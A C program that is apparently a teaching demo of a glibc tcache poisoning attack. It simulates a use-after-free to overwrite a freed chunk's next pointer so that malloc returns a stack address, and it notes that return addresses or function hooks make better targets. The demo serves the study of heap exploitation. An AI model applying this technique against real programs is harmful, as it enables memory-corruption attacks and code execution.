#include <stdio.h>
#include <stdlib.h>

int main(void)
{
	puts("So this is a quick demo of a tcache attack.");
	puts("The tcache is a bin that stores recently freed chunks (max 7 per idx by default).");
	puts("The tcache bin consists of a linked list, where one chunk points to the next chunk.");
	puts("This attack consists of using a bug to overwrite a pointer in the linked list to an address we want to allocate, then allocating it when it's that chunks turn to be allocated.");
	puts("Also the tcache was introduced in glibc version 2.26, so you won't be able to do this attack in libc versions before that.");
	puts("\n");

	printf("So let's start off by allocated two chunks, and let's initialize a stack integer.\n");

	unsigned long int *ptr0, *ptr1;
	int target;

	ptr0 = malloc(0x10);
	ptr1 = malloc(0x10);
	target = 0xdead;

	printf("ptr0: %p\n", ptr0);
	printf("ptr1: %p\n", ptr1);
	printf("int:  %p\n\n", &target);

	printf("Our objective here is to get malloc to return a pointer to the stack variable. Here that doesn't serve as much purpose (this is more of a proof of concept). However in a lot of different situations we can write to a chunk that is allocated.\n");
	printf("In addition to that, instead of allocating a chunk to a stack integer, we can allocate a chunk to something more interesting (like the saved return address or the hook to a function).\n");
	printf("So we will continue by freeing the two heap chunks, which will store them in the tcache.\n\n");

	free(ptr0);
	free(ptr1);

	printf("At this point, the two chunks we allocated using malloc are in the tcache. We can also see that there is a linked list which is used to keep track of which chunk is next in the tcache.\n\n");

	printf("Next pointer for ptr1: %p\n\n", (unsigned long int *)*ptr1);

	printf("As you can see, it points to the first chunk we allocated. This is chunks in the tcache are allocated in the reverse order in which they are inserted into it (think LIFO).\n");
	printf("So if we were to overwrite this pointer with a Use After Free bug (I'm pretending I have a UAF to ptr1 here), we can control the chunk which will be allocated from the tcache after ptr1.\n");
	printf("Let's write the address of the target stack integer over the next pointer.\n\n");

	*ptr1 = (unsigned long int)&target;
	printf("Next pointer for ptr1: %p\n\n", (unsigned long int *)*ptr1);

	printf("Now we will allocate a chunk. This should return the ptr1 chunk, and place the address of our target stack variable at the top of the tcache.\n\n");

	printf("Malloc Allocated: %p\n\n", malloc(0x10));

	printf("Now that the address of our stack integer is at the top of the tcache, the next chunk we allocate will be the target integer.\n\n");

	printf("Malloc Allocated: %p\n\n", malloc(0x10));

	printf("Just like that, we got malloc to allocate a chunk to the target stack variable. In practice we would try and allocate a chunk to something much more interesting (but this is more of a proof of concept).\n");
}